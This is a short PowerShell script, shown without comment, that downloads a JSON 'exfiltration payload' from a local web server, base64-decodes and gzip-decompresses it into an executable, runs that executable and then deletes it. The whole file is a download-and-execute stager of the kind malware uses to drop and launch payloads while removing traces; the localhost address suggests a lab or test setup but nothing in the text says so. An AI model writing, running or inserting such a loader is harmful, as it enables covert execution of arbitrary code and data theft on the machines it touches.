$fetched_data = Invoke-RestMethod -Uri "http://localhost:8000/exfiltration_payload.json"

$parsedBase64payload = [System.Convert]::FromBase64String($fetched_data.payloadContent)
$initialMemoryStream = New-Object System.IO.MemoryStream
$initialMemoryStream.Write($parsedBase64payload, 0, $parsedBase64payload.Length)
$initialMemoryStream.Seek(0,0) | Out-Null
$decompressed_binary = New-Object System.IO.BinaryReader(New-Object System.IO.Compression.GZipStream($initialMemoryStream, [System.IO.Compression.CompressionMode]::Decompress))
$decompressed_binary_bytes = $decompressed_binary.ReadBytes($fetched_data.payloadSize)
$filename = ".\exfiltration_decoded.exe"
Set-Content -Encoding Byte -Path $filename -Value $decompressed_binary_bytes
Invoke-Expression "& $filename"
Remove-Item $filename